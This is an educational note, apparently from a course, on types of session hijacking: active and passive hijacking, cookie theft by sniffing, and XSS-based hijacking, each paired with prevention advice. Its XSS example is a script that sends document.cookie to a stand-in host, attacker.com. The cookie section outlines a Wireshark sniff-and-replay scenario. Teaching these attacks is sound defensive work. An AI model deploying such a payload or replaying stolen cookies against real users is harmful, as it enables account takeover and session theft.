# 🔍 702 Types of Session Hijacking

Below are common types of session hijacking attacks based on the technique used.

---

## ⚔️ 1. Active vs Passive Hijacking

### ✅ Active Hijacking
- **Definition**: The attacker takes control of an active session by injecting or manipulating traffic in real time.
- **How it works**:
  - Man-in-the-middle (MITM) attack
  - TCP session manipulation
- **Risks**: Real-time session takeover; high detection risk.

### 🕵️ Passive Hijacking
- **Definition**: The attacker silently monitors traffic to extract useful information, such as credentials or tokens.
- **How it works**:
  - Sniffing unencrypted traffic
  - Packet analysis
- **Risks**: Harder to detect but does not involve immediate takeover.

| Type     | Involves Interaction? | Real-time? | Detection Risk |
|----------|------------------------|------------|----------------|
| Active   | Yes                    | Yes        | High           |
| Passive  | No                     | No         | Low            |

---

## 🍪 2. Cookie Hijacking

### Definition:
- An attacker steals a user's session cookie to gain unauthorized access to their session.

### How it Happens:
- Intercepting HTTP traffic on unsecured networks (especially HTTP, not HTTPS)
- Using malware or browser exploits
- Cross-site scripting (XSS)

### Example:
```plaintext
Attacker uses Wireshark to sniff an HTTP request.
Extracts session cookie: PHPSESSID=123456
Uses stolen cookie in their browser to impersonate the victim.
```

### Prevention:
- Use HTTPS for all traffic
- Set secure and HttpOnly flags on cookies
- Regenerate session tokens after login

---

🛡️ 3. XSS-Based Hijacking (Cross-Site Scripting)

### Definition:
The attacker injects malicious scripts into web pages viewed by other users to steal session cookies or tokens.

### Attack Flow:
- Attacker submits malicious JavaScript to a vulnerable form.
- Victim loads the page with the malicious script.
- Script executes in victim’s browser, stealing session cookie.
- Attacker sends cookie to remote server and hijacks session.

### Example Script:
```html
<script>
  var i = new Image();
  i.src="http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

### Prevention:
- Input validation and sanitization
- Use Content Security Policy (CSP)
- Encode outputs on dynamic web pages

---

📘 Summary

| Attack Type           | Primary Technique   | Risk Level  | Mitigation Techniques                  |
|-----------------------|---------------------|-------------|----------------------------------------|
| Active Hijacking      | Traffic Injection   | High        | Encryption, session tokens             |
| Passive Hijacking     | Packet Sniffing     | Medium      | Secure protocols (HTTPS, SSH)         |
| Cookie Hijacking      | Stealing cookies    | High        | HTTPS, Secure cookie attributes        |
| XSS-Based Hijacking   | JavaScript Injection| Very High   | CSP, input validation, output encoding|

---

> 🧠 Session hijacking is a powerful attack vector — secure your sessions as if your entire system depends on it. Because it does.

